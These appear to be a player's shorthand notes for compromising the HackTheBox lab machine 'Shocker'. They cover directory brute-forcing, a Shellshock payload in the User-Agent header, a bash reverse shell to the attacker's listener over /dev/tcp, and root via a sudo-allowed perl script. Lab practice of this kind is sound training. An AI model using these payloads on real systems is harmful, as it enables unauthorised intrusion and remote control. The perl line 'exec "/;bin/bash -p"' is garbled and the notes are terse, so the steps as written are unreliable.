ping 10.10.10.56
whatweb 10.10.10.56

echo "10.10.10.56 shocker.htb" >> /etc/hosts

nmap shocker.htb
access web page

feroxbuster http://shocker.htb -x php,html
feroxbuster http://shocker.htb -f -n

feroxbuster http://shocker.htb/cgi-bin/ -x sh,cgi,pl -> get /user.sh
access from burp suite -> send to repeater

shellshock
change "User-Agent:" value to:
() { :;}; echo; /usr/bin/id
() { :;}; echo; /bin/ping -c 1 <kali ip>

nc -nvlp 9001
() { :;}; echo; /bin/bash -i >& /dev/tcp/<kali ip>/9001 0>&1

cat /home/shelly
get user.txt

sudo -l
(root) NOPASSWD: /usr/bin/perl

nano root.pl
-------------------
exec "/;bin/bash -p"
-------------------

sudo /usr/bin/perl root.pl

cd /home/root
get root.txt